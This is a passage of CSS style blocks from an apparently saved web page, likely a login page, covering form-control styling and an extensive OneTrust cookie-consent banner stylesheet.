      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select[dir][aria-disabled] {
        padding-right: 2.5rem;
      }

      .default-ltr-cache-crcdk0,
      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1,
      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select {
        min-width: auto;
        width: auto;
      }

      .default-ltr-cache-crcdk0 .form-control_descriptionStyles__oy4jpq6 {
        font-size: 0.8125rem;
        font-weight: 400;
        color: rgba(255, 255, 255, 0.7);
        margin-top: 0.375rem;
      }

      .default-ltr-cache-crcdk0 .form-control_validationMessageStyles__oy4jpq7 {
        font-size: 0.8125rem;
        font-weight: 400;
        margin-top: 0.375rem;
        color: rgba(255, 255, 255, 0.7);
      }

      .default-ltr-cache-crcdk0 .form-control_validationMessageStyles__oy4jpq7 .e1vkmu653,
      .default-ltr-cache-crcdk0 .form-control_validationMessageStyles__oy4jpq7 .e1vkmu652,
      .default-ltr-cache-crcdk0 .form-control_validationMessageStyles__oy4jpq7 .e1vkmu654 {
        margin-right: 0.25rem;
        top: 0.1875rem;
      }
    </style>
    <style data-emotion="default-ltr-cache pnamzc" data-s="">
      .default-ltr-cache-pnamzc {
        position: absolute;
        pointer-events: none;
        width: 1rem;
        height: 1rem;
        left: 0.75rem;
        right: auto;
        z-index: 1;
      }

      .default-ltr-cache-pnamzc>svg {
        width: 100%;
        height: 100%;
        display: block;
      }

      .default-ltr-cache-pnamzc>:not(svg) {
        opacity: 1;
      }
    </style>
    <style data-emotion="default-ltr-cache" data-s=""></style>
    <link id="nordvpn-contentScript-extension-fonts" rel="stylesheet" href="./login_files/css">
    <style id="onetrust-style">
      #onetrust-banner-sdk .onetrust-vendors-list-handler {
        cursor: pointer;
        color: #1f96db;
        font-size: inherit;
        font-weight: bold;
        text-decoration: none;
        margin-left: 5px
      }

      #onetrust-banner-sdk .onetrust-vendors-list-handler:hover {
        color: #1f96db
      }

      #onetrust-banner-sdk:focus {
        outline: 2px solid #000;
        outline-offset: -2px
      }

      #onetrust-banner-sdk a:focus {
        outline: 2px solid #000
      }

      #onetrust-banner-sdk #onetrust-accept-btn-handler,
      #onetrust-banner-sdk #onetrust-reject-all-handler,
      #onetrust-banner-sdk #onetrust-pc-btn-handler {
        outline-offset: 1px
      }

      #onetrust-banner-sdk.ot-bnr-w-logo .ot-bnr-logo {
        height: 64px;
        width: 64px
      }

      #onetrust-banner-sdk .ot-tcf2-vendor-count.ot-text-bold {
        font-weight: bold
      }

      #onetrust-banner-sdk .ot-close-icon,
      #onetrust-pc-sdk .ot-close-icon,
      #ot-sync-ntfy .ot-close-icon {
        background-size: contain;
        background-repeat: no-repeat;
        background-position: center;
        height: 12px;
        width: 12px
      }

      #onetrust-banner-sdk .powered-by-logo,
      #onetrust-banner-sdk .ot-pc-footer-logo a,
      #onetrust-pc-sdk .powered-by-logo,
      #onetrust-pc-sdk .ot-pc-footer-logo a,
      #ot-sync-ntfy .powered-by-logo,
      #ot-sync-ntfy .ot-pc-footer-logo a {
        background-size: contain;
        background-repeat: no-repeat;
        background-position: center;
        height: 25px;
        width: 152px;
        display: block;
        text-decoration: none;
        font-size: .75em
      }

      #onetrust-banner-sdk .powered-by-logo:hover,
      #onetrust-banner-sdk .ot-pc-footer-logo a:hover,
      #onetrust-pc-sdk .powered-by-logo:hover,
      #onetrust-pc-sdk .ot-pc-footer-logo a:hover,
      #ot-sync-ntfy .powered-by-logo:hover,
      #ot-sync-ntfy .ot-pc-footer-logo a:hover {
        color: #565656
      }

      #onetrust-banner-sdk h3 *,
      #onetrust-banner-sdk h4 *,
      #onetrust-banner-sdk h6 *,
      #onetrust-banner-sdk button *,
      #onetrust-banner-sdk a[data-parent-id] *,
      #onetrust-pc-sdk h3 *,
      #onetrust-pc-sdk h4 *,
      #onetrust-pc-sdk h6 *,
      #onetrust-pc-sdk button *,
      #onetrust-pc-sdk a[data-parent-id] *,
      #ot-sync-ntfy h3 *,
      #ot-sync-ntfy h4 *,
      #ot-sync-ntfy h6 *,
      #ot-sync-ntfy button *,
      #ot-sync-ntfy a[data-parent-id] * {
        font-size: inherit;
        font-weight: inherit;
        color: inherit
      }

      #onetrust-banner-sdk .ot-hide,
      #onetrust-pc-sdk .ot-hide,
      #ot-sync-ntfy .ot-hide {
        display: none !important
      }

      #onetrust-banner-sdk button.ot-link-btn:hover,
      #onetrust-pc-sdk button.ot-link-btn:hover,
      #ot-sync-ntfy button.ot-link-btn:hover {
        text-decoration: underline;
        opacity: 1
      }

      #onetrust-pc-sdk .ot-sdk-row .ot-sdk-column {
        padding: 0
      }

      #onetrust-pc-sdk .ot-sdk-container {
        padding-right: 0
      }

      #onetrust-pc-sdk .ot-sdk-row {
        flex-direction: initial;
        width: 100%
      }

      #onetrust-pc-sdk [type=checkbox]:checked,
      #onetrust-pc-sdk [type=checkbox]:not(:checked) {
        pointer-events: initial
      }

      #onetrust-pc-sdk [type=checkbox]:disabled+label::before,
      #onetrust-pc-sdk [type=checkbox]:disabled+label:after,
      #onetrust-pc-sdk [type=checkbox]:disabled+label {
        pointer-events: none;
        opacity: .8
      }

      #onetrust-pc-sdk #vendor-list-content {
        transform: translate3d(0, 0, 0)
      }

      #onetrust-pc-sdk li input[type=checkbox] {
        z-index: 1
      }

      #onetrust-pc-sdk li .ot-checkbox label {
        z-index: 2
      }

      #onetrust-pc-sdk li .ot-checkbox input[type=checkbox] {
        height: auto;
        width: auto
      }

      #onetrust-pc-sdk li .host-title a,
      #onetrust-pc-sdk li .ot-host-name a,
      #onetrust-pc-sdk li .accordion-text,
      #onetrust-pc-sdk li .ot-acc-txt {
        z-index: 2;
        position: relative
      }

      #onetrust-pc-sdk input {
        margin: 3px .1ex
      }

      #onetrust-pc-sdk .pc-logo,
      #onetrust-pc-sdk .ot-pc-logo {
        height: 60px;
        width: 180px;
        background-position: center;
        background-size: contain;
        background-repeat: no-repeat;
        display: inline-flex;
        justify-content: center;
        align-items: center
      }

      #onetrust-pc-sdk .pc-logo img,
      #onetrust-pc-sdk .ot-pc-logo img {
        max-height: 100%;
        max-width: 100%
      }

      #onetrust-pc-sdk .screen-reader-only,
      #onetrust-pc-sdk .ot-scrn-rdr,
      .ot-sdk-cookie-policy .screen-reader-only,
      .ot-sdk-cookie-policy .ot-scrn-rdr {
        border: 0;
        clip: rect(0 0 0 0);
        height: 1px;
        margin: -1px;
        overflow: hidden;
        padding: 0;
        position: absolute;
        width: 1px
      }

      #onetrust-pc-sdk.ot-fade-in,
      .onetrust-pc-dark-filter.ot-fade-in,
      #onetrust-banner-sdk.ot-fade-in {
        animation-name: onetrust-fade-in;
        animation-duration: 400ms;
        animation-timing-function: ease-in-out
      }

      #onetrust-pc-sdk.ot-hide {
        display: none !important
      }

      .onetrust-pc-dark-filter.ot-hide {
        display: none !important
      }

      #ot-sdk-btn.ot-sdk-show-settings,
      #ot-sdk-btn.optanon-show-settings {
        color: #68b631;
        border: 1px solid #68b631;
        height: auto;
        white-space: normal;
        word-wrap: break-word;
        padding: .8em 2em;
        font-size: .8em;
        line-height: 1.2;
        cursor: pointer;
        -moz-transition: .1s ease;
        -o-transition: .1s ease;
        -webkit-transition: 1s ease;
        transition: .1s ease
      }

      #ot-sdk-btn.ot-sdk-show-settings:hover,
      #ot-sdk-btn.optanon-show-settings:hover {
        color: #fff;
        background-color: #68b631
      }

      .onetrust-pc-dark-filter {
        background: rgba(0, 0, 0, .5);
        z-index: 2147483646;
        width: 100%;
        height: 100%;
        overflow: hidden;
        position: fixed;
        top: 0;
        bottom: 0;
        left: 0
      }

      @keyframes onetrust-fade-in {
        0% {
          opacity: 0
        }

        100% {
          opacity: 1
        }
      }

      .ot-cookie-label {
        text-decoration: underline
      }

      @media only screen and (min-width: 426px)and (max-width: 896px)and (orientation: landscape) {
        #onetrust-pc-sdk p {
          font-size: .75em
        }
      }

      #onetrust-banner-sdk .banner-option-input:focus+label {
        outline: 1px solid #000;
        outline-style: auto
      }

      .category-vendors-list-handler+a:focus,
      .category-vendors-list-handler+a:focus-visible {
        outline: 2px solid #000
      }

      #onetrust-pc-sdk .ot-userid-title {
        margin-top: 10px
      }

      #onetrust-pc-sdk .ot-userid-title>span,
      #onetrust-pc-sdk .ot-userid-timestamp>span {
        font-weight: 700
      }

      #onetrust-pc-sdk .ot-userid-desc {
        font-style: italic
      }

      #onetrust-pc-sdk .ot-host-desc a {
        pointer-events: initial
      }

      #onetrust-pc-sdk .ot-ven-hdr>p a {
        position: relative;
        z-index: 2;
        pointer-events: initial
      }

      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info a,
      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info a {
        margin-right: auto
      }

      #onetrust-pc-sdk .ot-pc-footer-logo img {
        width: 136px;
        height: 16px
      }

      #onetrust-pc-sdk .ot-pur-vdr-count {
        font-weight: 400;
        font-size: .7rem;
        padding-top: 3px;
        display: block
      }

      #onetrust-banner-sdk .ot-optout-signal,
      #onetrust-pc-sdk .ot-optout-signal {
        border: 1px solid #32ae88;
        border-radius: 3px;
        padding: 5px;
        margin-bottom: 10px;
        background-color: #f9fffa;
        font-size: .85rem;
        line-height: 2
      }

      #onetrust-banner-sdk .ot-optout-signal .ot-optout-icon,
      #onetrust-pc-sdk .ot-optout-signal .ot-optout-icon {
        display: inline;
        margin-right: 5px
      }

      #onetrust-banner-sdk .ot-optout-signal svg,
      #onetrust-pc-sdk .ot-optout-signal svg {
        height: 20px;
        width: 30px;
        transform: scale(0.5)
      }

      #onetrust-banner-sdk .ot-optout-signal svg path,
      #onetrust-pc-sdk .ot-optout-signal svg path {
        fill: #32ae88
      }

      #onetrust-consent-sdk .ot-general-modal {
        overflow: hidden;
        position: fixed;
        margin: 0 auto;
        top: 50%;
        left: 50%;
        width: 40%;
        padding: 1.5rem;
        max-width: 575px;
        min-width: 575px;
        z-index: 2147483647;
        border-radius: 2.5px;
        transform: translate(-50%, -50%)
      }

      #onetrust-consent-sdk .ot-signature-health-group {
        margin-top: 1rem;
        padding-left: 1.25rem;
        padding-right: 1.25rem;
        margin-bottom: .625rem;
        width: calc(100% - 2.5rem)
      }

      #onetrust-consent-sdk .ot-signature-health-group .ot-signature-health-form {
        gap: .5rem
      }

      #onetrust-consent-sdk .ot-signature-health .ot-signature-health-form {
        width: 70%;
        gap: .35rem
      }

      #onetrust-consent-sdk .ot-signature-health .ot-signature-input {
        height: 38px;
        padding: 6px 10px;
        background-color: #fff;
        border: 1px solid #d1d1d1;
        border-radius: 4px;
        box-shadow: none;
        box-sizing: border-box
      }

      #onetrust-consent-sdk .ot-signature-health .ot-signature-subtitle {
        font-size: 1.125rem
      }

      #onetrust-consent-sdk .ot-signature-health .ot-signature-group-title {
        font-size: 1.25rem;
        font-weight: bold
      }

      #onetrust-consent-sdk .ot-signature-health,
      #onetrust-consent-sdk .ot-signature-health-group {
        display: flex;
        flex-direction: column;
        gap: 1rem
      }

      #onetrust-consent-sdk .ot-signature-health .ot-signature-cont,
      #onetrust-consent-sdk .ot-signature-health-group .ot-signature-cont {
        display: flex;
        flex-direction: column;
        gap: .25rem
      }

      #onetrust-consent-sdk .ot-signature-health .ot-signature-paragraph,
      #onetrust-consent-sdk .ot-signature-health-group .ot-signature-paragraph {
        margin: 0;
        line-height: 20px;
        font-size: max(14px, .875rem)
      }

      #onetrust-consent-sdk .ot-signature-health .ot-health-signature-error,
      #onetrust-consent-sdk .ot-signature-health-group .ot-health-signature-error {
        color: #4d4d4d;
        font-size: min(12px, .75rem)
      }

      #onetrust-consent-sdk .ot-signature-health .ot-signature-buttons-cont,
      #onetrust-consent-sdk .ot-signature-health-group .ot-signature-buttons-cont {
        margin-top: max(.75rem, 2%);
        gap: 1rem;
        display: flex;
        justify-content: flex-end
      }

      #onetrust-consent-sdk .ot-signature-health .ot-signature-button,
      #onetrust-consent-sdk .ot-signature-health-group .ot-signature-button {
        flex: 1;
        height: auto;
        color: #fff;
        cursor: pointer;
        line-height: 1.2;
        min-width: 125px;
        font-weight: 600;
        font-size: .813em;
        border-radius: 2px;
        padding: 12px 10px;
        white-space: normal;
        word-wrap: break-word;
        word-break: break-word;
        background-color: #68b631;
        border: 2px solid #68b631
      }

      #onetrust-consent-sdk .ot-signature-health .ot-signature-button.reject,
      #onetrust-consent-sdk .ot-signature-health-group .ot-signature-button.reject {
        background-color: #fff
      }

      #onetrust-consent-sdk .ot-input-field-cont {
        display: flex;
        flex-direction: column;
        gap: .5rem
      }

      #onetrust-consent-sdk .ot-input-field-cont .ot-signature-input {
        width: 65%
      }

      #onetrust-consent-sdk .ot-signature-health-form {
        display: flex;
        flex-direction: column
      }

      #onetrust-consent-sdk .ot-signature-health-form .ot-signature-label {
        margin-bottom: 0;
        line-height: 20px;
        font-size: max(14px, .875rem)
      }

      @media only screen and (max-width: 600px) {
        #onetrust-consent-sdk .ot-general-modal {
          min-width: 100%
        }

        #onetrust-consent-sdk .ot-signature-health .ot-signature-health-form {
          width: 100%
        }

        #onetrust-consent-sdk .ot-input-field-cont .ot-signature-input {
          width: 100%
        }
      }

      #onetrust-banner-sdk,
      #onetrust-pc-sdk,
      #ot-sdk-cookie-policy,
      #ot-sync-ntfy {
        font-size: 16px
      }

      #onetrust-banner-sdk *,
      #onetrust-banner-sdk ::after,
      #onetrust-banner-sdk ::before,
      #onetrust-pc-sdk *,
      #onetrust-pc-sdk ::after,
      #onetrust-pc-sdk ::before,
      #ot-sdk-cookie-policy *,
      #ot-sdk-cookie-policy ::after,
      #ot-sdk-cookie-policy ::before,
      #ot-sync-ntfy *,
      #ot-sync-ntfy ::after,
      #ot-sync-ntfy ::before {
        -webkit-box-sizing: content-box;
        -moz-box-sizing: content-box;
        box-sizing: content-box
      }

      #onetrust-banner-sdk div,
      #onetrust-banner-sdk span,
      #onetrust-banner-sdk h1,
      #onetrust-banner-sdk h2,
      #onetrust-banner-sdk h3,
      #onetrust-banner-sdk h4,
      #onetrust-banner-sdk h5,
      #onetrust-banner-sdk h6,
      #onetrust-banner-sdk p,
      #onetrust-banner-sdk img,
      #onetrust-banner-sdk svg,
      #onetrust-banner-sdk button,
      #onetrust-banner-sdk section,
      #onetrust-banner-sdk a,
      #onetrust-banner-sdk label,
      #onetrust-banner-sdk input,
      #onetrust-banner-sdk ul,
      #onetrust-banner-sdk li,
      #onetrust-banner-sdk nav,
      #onetrust-banner-sdk table,
      #onetrust-banner-sdk thead,
      #onetrust-banner-sdk tr,
      #onetrust-banner-sdk td,
      #onetrust-banner-sdk tbody,
      #onetrust-banner-sdk .ot-main-content,
      #onetrust-banner-sdk .ot-toggle,
      #onetrust-banner-sdk #ot-content,
      #onetrust-banner-sdk #ot-pc-content,
      #onetrust-banner-sdk .checkbox,
      #onetrust-pc-sdk div,
      #onetrust-pc-sdk span,
      #onetrust-pc-sdk h1,
      #onetrust-pc-sdk h2,
      #onetrust-pc-sdk h3,
      #onetrust-pc-sdk h4,
      #onetrust-pc-sdk h5,
      #onetrust-pc-sdk h6,
      #onetrust-pc-sdk p,
      #onetrust-pc-sdk img,
      #onetrust-pc-sdk svg,
      #onetrust-pc-sdk button,
      #onetrust-pc-sdk section,
      #onetrust-pc-sdk a,
      #onetrust-pc-sdk label,
      #onetrust-pc-sdk input,
      #onetrust-pc-sdk ul,
      #onetrust-pc-sdk li,
      #onetrust-pc-sdk nav,
      #onetrust-pc-sdk table,
      #onetrust-pc-sdk thead,
      #onetrust-pc-sdk tr,
      #onetrust-pc-sdk td,
      #onetrust-pc-sdk tbody,
      #onetrust-pc-sdk .ot-main-content,
      #onetrust-pc-sdk .ot-toggle,
      #onetrust-pc-sdk #ot-content,
      #onetrust-pc-sdk #ot-pc-content,
      #onetrust-pc-sdk .checkbox,
      #ot-sdk-cookie-policy div,
      #ot-sdk-cookie-policy span,
      #ot-sdk-cookie-policy h1,
      #ot-sdk-cookie-policy h2,
      #ot-sdk-cookie-policy h3,
      #ot-sdk-cookie-policy h4,
      #ot-sdk-cookie-policy h5,
      #ot-sdk-cookie-policy h6,
      #ot-sdk-cookie-policy p,
      #ot-sdk-cookie-policy img,
      #ot-sdk-cookie-policy svg,
      #ot-sdk-cookie-policy button,
      #ot-sdk-cookie-policy section,
      #ot-sdk-cookie-policy a,
      #ot-sdk-cookie-policy label,
      #ot-sdk-cookie-policy input,
      #ot-sdk-cookie-policy ul,
      #ot-sdk-cookie-policy li,
      #ot-sdk-cookie-policy nav,
      #ot-sdk-cookie-policy table,
      #ot-sdk-cookie-policy thead,
      #ot-sdk-cookie-policy tr,
      #ot-sdk-cookie-policy td,
      #ot-sdk-cookie-policy tbody,
      #ot-sdk-cookie-policy .ot-main-content,
      #ot-sdk-cookie-policy .ot-toggle,
      #ot-sdk-cookie-policy #ot-content,
      #ot-sdk-cookie-policy #ot-pc-content,
      #ot-sdk-cookie-policy .checkbox,
      #ot-sync-ntfy div,
      #ot-sync-ntfy span,
      #ot-sync-ntfy h1,
      #ot-sync-ntfy h2,
      #ot-sync-ntfy h3,
      #ot-sync-ntfy h4,
      #ot-sync-ntfy h5,
      #ot-sync-ntfy h6,
      #ot-sync-ntfy p,
      #ot-sync-ntfy img,
      #ot-sync-ntfy svg,
      #ot-sync-ntfy button,
      #ot-sync-ntfy section,
      #ot-sync-ntfy a,
      #ot-sync-ntfy label,
      #ot-sync-ntfy input,
      #ot-sync-ntfy ul,
      #ot-sync-ntfy li,
      #ot-sync-ntfy nav,
      #ot-sync-ntfy table,
      #ot-sync-ntfy thead,
      #ot-sync-ntfy tr,
      #ot-sync-ntfy td,
      #ot-sync-ntfy tbody,
      #ot-sync-ntfy .ot-main-content,
      #ot-sync-ntfy .ot-toggle,
      #ot-sync-ntfy #ot-content,
      #ot-sync-ntfy #ot-pc-content,
      #ot-sync-ntfy .checkbox {
        font-family: inherit;
        font-weight: normal;
        -webkit-font-smoothing: auto;
        letter-spacing: normal;
        line-height: normal;
        padding: 0;
        margin: 0;
        height: auto;
        min-height: 0;
        max-height: none;
        width: auto;
        min-width: 0;
        max-width: none;
        border-radius: 0;
        border: none;
        clear: none;
        float: none;
        position: static;
        bottom: auto;
        left: auto;
        right: auto;
        top: auto;
        text-align: left;
        text-decoration: none;
        text-indent: 0;
        text-shadow: none;
        text-transform: none;
        white-space: normal;
        background: none;
        overflow: visible;
        vertical-align: baseline;
        visibility: visible;
        z-index: auto;
        box-shadow: none
      }

      #onetrust-banner-sdk label:before,
      #onetrust-banner-sdk label:after,
      #onetrust-banner-sdk .checkbox:after,
      #onetrust-banner-sdk .checkbox:before,
      #onetrust-pc-sdk label:before,
      #onetrust-pc-sdk label:after,
      #onetrust-pc-sdk .checkbox:after,
      #onetrust-pc-sdk .checkbox:before,
      #ot-sdk-cookie-policy label:before,
      #ot-sdk-cookie-policy label:after,
      #ot-sdk-cookie-policy .checkbox:after,
      #ot-sdk-cookie-policy .checkbox:before,
      #ot-sync-ntfy label:before,
      #ot-sync-ntfy label:after,
      #ot-sync-ntfy .checkbox:after,
      #ot-sync-ntfy .checkbox:before {
        content: "";
        content: none
      }

      #onetrust-banner-sdk .ot-sdk-container,
      #onetrust-pc-sdk .ot-sdk-container,
      #ot-sdk-cookie-policy .ot-sdk-container {
        position: relative;
        width: 100%;
        max-width: 100%;
        margin: 0 auto;
        padding: 0 20px;
        box-sizing: border-box
      }

      #onetrust-banner-sdk .ot-sdk-column,
      #onetrust-banner-sdk .ot-sdk-columns,
      #onetrust-pc-sdk .ot-sdk-column,
      #onetrust-pc-sdk .ot-sdk-columns,
      #ot-sdk-cookie-policy .ot-sdk-column,
      #ot-sdk-cookie-policy .ot-sdk-columns {
        width: 100%;
        float: left;
        box-sizing: border-box;
        padding: 0;
        display: initial
      }

      @media(min-width: 400px) {

        #onetrust-banner-sdk .ot-sdk-container,
        #onetrust-pc-sdk .ot-sdk-container,
        #ot-sdk-cookie-policy .ot-sdk-container {
          width: 90%;
          padding: 0
        }
      }

      @media(min-width: 550px) {

        #onetrust-banner-sdk .ot-sdk-container,
        #onetrust-pc-sdk .ot-sdk-container,
        #ot-sdk-cookie-policy .ot-sdk-container {
          width: 100%
        }

        #onetrust-banner-sdk .ot-sdk-column,
        #onetrust-banner-sdk .ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-column,
        #onetrust-pc-sdk .ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-column,
        #ot-sdk-cookie-policy .ot-sdk-columns {
          margin-left: 4%
        }

        #onetrust-banner-sdk .ot-sdk-column:first-child,
        #onetrust-banner-sdk .ot-sdk-columns:first-child,
        #onetrust-pc-sdk .ot-sdk-column:first-child,
        #onetrust-pc-sdk .ot-sdk-columns:first-child,
        #ot-sdk-cookie-policy .ot-sdk-column:first-child,
        #ot-sdk-cookie-policy .ot-sdk-columns:first-child {
          margin-left: 0
        }

        #onetrust-banner-sdk .ot-sdk-two.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-two.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-two.ot-sdk-columns {
          width: 13.3333333333%
        }

        #onetrust-banner-sdk .ot-sdk-three.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-three.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-three.ot-sdk-columns {
          width: 22%
        }

        #onetrust-banner-sdk .ot-sdk-four.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-four.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-four.ot-sdk-columns {
          width: 30.6666666667%
        }

        #onetrust-banner-sdk .ot-sdk-eight.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-eight.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-eight.ot-sdk-columns {
          width: 65.3333333333%
        }

        #onetrust-banner-sdk .ot-sdk-nine.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-nine.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-nine.ot-sdk-columns {
          width: 74%
        }

        #onetrust-banner-sdk .ot-sdk-ten.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-ten.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-ten.ot-sdk-columns {
          width: 82.6666666667%
        }

        #onetrust-banner-sdk .ot-sdk-eleven.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-eleven.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-eleven.ot-sdk-columns {
          width: 91.3333333333%
        }

        #onetrust-banner-sdk .ot-sdk-twelve.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-twelve.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-twelve.ot-sdk-columns {
          width: 100%;
          margin-left: 0
        }
      }

      #onetrust-banner-sdk h1,
      #onetrust-banner-sdk h2,
      #onetrust-banner-sdk h3,
      #onetrust-banner-sdk h4,
      #onetrust-banner-sdk h5,
      #onetrust-banner-sdk h6,
      #onetrust-pc-sdk h1,
      #onetrust-pc-sdk h2,
      #onetrust-pc-sdk h3,
      #onetrust-pc-sdk h4,
      #onetrust-pc-sdk h5,
      #onetrust-pc-sdk h6,
      #ot-sdk-cookie-policy h1,
      #ot-sdk-cookie-policy h2,
      #ot-sdk-cookie-policy h3,
      #ot-sdk-cookie-policy h4,
      #ot-sdk-cookie-policy h5,
      #ot-sdk-cookie-policy h6 {
        margin-top: 0;
        font-weight: 600;
        font-family: inherit
      }

      #onetrust-banner-sdk h1,
      #onetrust-pc-sdk h1,
      #ot-sdk-cookie-policy h1 {
        font-size: 1.5rem;
        line-height: 1.2
      }

      #onetrust-banner-sdk h2,
      #onetrust-pc-sdk h2,
      #ot-sdk-cookie-policy h2 {
        font-size: 1.5rem;
        line-height: 1.25
      }

      #onetrust-banner-sdk h3,
      #onetrust-pc-sdk h3,
      #ot-sdk-cookie-policy h3 {
        font-size: 1.5rem;
        line-height: 1.3
      }

      #onetrust-banner-sdk h4,
      #onetrust-pc-sdk h4,
      #ot-sdk-cookie-policy h4 {
        font-size: 1.5rem;
        line-height: 1.35
      }

      #onetrust-banner-sdk h5,
      #onetrust-pc-sdk h5,
      #ot-sdk-cookie-policy h5 {
        font-size: 1.5rem;
        line-height: 1.5
      }

      #onetrust-banner-sdk h6,
      #onetrust-pc-sdk h6,
      #ot-sdk-cookie-policy h6 {
        font-size: 1.5rem;
        line-height: 1.6
      }

      @media(min-width: 550px) {

        #onetrust-banner-sdk h1,
        #onetrust-pc-sdk h1,
        #ot-sdk-cookie-policy h1 {
          font-size: 1.5rem
        }

        #onetrust-banner-sdk h2,
        #onetrust-pc-sdk h2,
        #ot-sdk-cookie-policy h2 {
          font-size: 1.5rem
        }

        #onetrust-banner-sdk h3,
        #onetrust-pc-sdk h3,
        #ot-sdk-cookie-policy h3 {
          font-size: 1.5rem
        }

        #onetrust-banner-sdk h4,
        #onetrust-pc-sdk h4,
        #ot-sdk-cookie-policy h4 {
          font-size: 1.5rem
        }

        #onetrust-banner-sdk h5,
        #onetrust-pc-sdk h5,
        #ot-sdk-cookie-policy h5 {
          font-size: 1.5rem
        }

        #onetrust-banner-sdk h6,
        #onetrust-pc-sdk h6,
        #ot-sdk-cookie-policy h6 {
          font-size: 1.5rem
        }
      }

      #onetrust-banner-sdk p,
      #onetrust-pc-sdk p,
      #ot-sdk-cookie-policy p {
        margin: 0 0 1em 0;
        font-family: inherit;
        line-height: normal
      }

      #onetrust-banner-sdk a,
      #onetrust-pc-sdk a,
      #ot-sdk-cookie-policy a {
        color: #565656;
        text-decoration: underline
      }

      #onetrust-banner-sdk a:hover,
      #onetrust-pc-sdk a:hover,
      #ot-sdk-cookie-policy a:hover {
        color: #565656;
        text-decoration: none
      }

      #onetrust-banner-sdk .ot-sdk-button,
      #onetrust-banner-sdk button,
      #onetrust-pc-sdk .ot-sdk-button,
      #onetrust-pc-sdk button,
      #ot-sdk-cookie-policy .ot-sdk-button,
      #ot-sdk-cookie-policy button {
        margin-bottom: 1rem;
        font-family: inherit
      }

      #onetrust-banner-sdk .ot-sdk-button,
      #onetrust-banner-sdk button,
      #onetrust-pc-sdk .ot-sdk-button,
      #onetrust-pc-sdk button,
      #ot-sdk-cookie-policy .ot-sdk-button,
      #ot-sdk-cookie-policy button {
        display: inline-block;
        height: 38px;
        padding: 0 30px;
        color: #555;
        text-align: center;
        font-size: .9em;
        font-weight: 400;
        line-height: 38px;
        letter-spacing: .01em;
        text-decoration: none;
        white-space: nowrap;
        background-color: rgba(0, 0, 0, 0);
        border-radius: 2px;
        border: 1px solid #bbb;
        cursor: pointer;
        box-sizing: border-box
      }

      #onetrust-banner-sdk .ot-sdk-button:hover,
      #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):hover,
      #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):focus,
      #onetrust-pc-sdk .ot-sdk-button:hover,
      #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):hover,
      #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):focus,
      #ot-sdk-cookie-policy .ot-sdk-button:hover,
      #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:not(.ot-link-btn):hover,
      #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:not(.ot-link-btn):focus {
        color: #333;
        border-color: #888;
        opacity: .7
      }

      #onetrust-banner-sdk .ot-sdk-button:focus,
      #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:focus,
      #onetrust-pc-sdk .ot-sdk-button:focus,
      #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:focus,
      #ot-sdk-cookie-policy .ot-sdk-button:focus,
      #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:focus {
        outline: 2px solid #000
      }

      #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary,
      #onetrust-banner-sdk button.ot-sdk-button-primary,
      #onetrust-banner-sdk input[type=submit].ot-sdk-button-primary,
      #onetrust-banner-sdk input[type=reset].ot-sdk-button-primary,
      #onetrust-banner-sdk input[type=button].ot-sdk-button-primary,
      #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary,
      #onetrust-pc-sdk button.ot-sdk-button-primary,
      #onetrust-pc-sdk input[type=submit].ot-sdk-button-primary,
      #onetrust-pc-sdk input[type=reset].ot-sdk-button-primary,
      #onetrust-pc-sdk input[type=button].ot-sdk-button-primary,
      #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary,
      #ot-sdk-cookie-policy button.ot-sdk-button-primary,
      #ot-sdk-cookie-policy input[type=submit].ot-sdk-button-primary,
      #ot-sdk-cookie-policy input[type=reset].ot-sdk-button-primary,
      #ot-sdk-cookie-policy input[type=button].ot-sdk-button-primary {
        color: #fff;
        background-color: #33c3f0;
        border-color: #33c3f0
      }

      #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
      #onetrust-banner-sdk button.ot-sdk-button-primary:hover,
      #onetrust-banner-sdk input[type=submit].ot-sdk-button-primary:hover,
      #onetrust-banner-sdk input[type=reset].ot-sdk-button-primary:hover,
      #onetrust-banner-sdk input[type=button].ot-sdk-button-primary:hover,
      #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
      #onetrust-banner-sdk button.ot-sdk-button-primary:focus,
      #onetrust-banner-sdk input[type=submit].ot-sdk-button-primary:focus,
      #onetrust-banner-sdk input[type=reset].ot-sdk-button-primary:focus,
      #onetrust-banner-sdk input[type=button].ot-sdk-button-primary:focus,
      #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
